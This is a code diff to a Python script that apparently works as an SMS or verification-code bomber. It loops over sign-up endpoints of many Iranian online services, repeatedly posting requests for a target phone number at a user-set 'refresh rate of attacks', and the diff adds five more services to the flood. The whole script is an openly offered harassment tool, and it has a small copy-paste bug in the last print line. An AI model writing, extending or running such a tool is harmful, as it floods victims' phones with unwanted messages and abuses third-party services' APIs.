@@ -16,7 +16,7 @@ cyan = "\033[36m"
 purple = "\033[35m"
 ######################
 
-from date import number, url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_torob, url_cafebazaar, json_cafebazaar
+from date import number, url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_torob, url_cafebazaar, json_cafebazaar , url_gap , url_sibche , json_sibche, url_ponisha, json_ponisha, url_karlancer, json_karlancer, url_jobvision
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))
 
@@ -124,10 +124,20 @@ while i < numbert:
     req_cafebazaar = requests.post(url=url_cafebazaar,json=json_cafebazaar,headers=random_head)
     print("25-cafebazaar",req_cafebazaar)
 
+    req_gap = requests.post(url=url_gap,headers=random_head)
+    print("26-gap",req_gap)
 
+    req_sibche = requests.post(url=url_sibche,json=json_sibche,headers=random_head)
+    print("27-sibche",req_sibche)
 
+    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
+    print("28-ponisha",req_ponisha)
 
+    req_karlancer = requests.post(url=url_karlancer,json=json_karlancer,headers=random_head)
+    print("29-karlancer",req_karlancer)
 
+    req_jobvision = requests.post(url=url_jobvision,headers=random_head)
+    print("30-jobvision",req_karlancer)
 
 
 
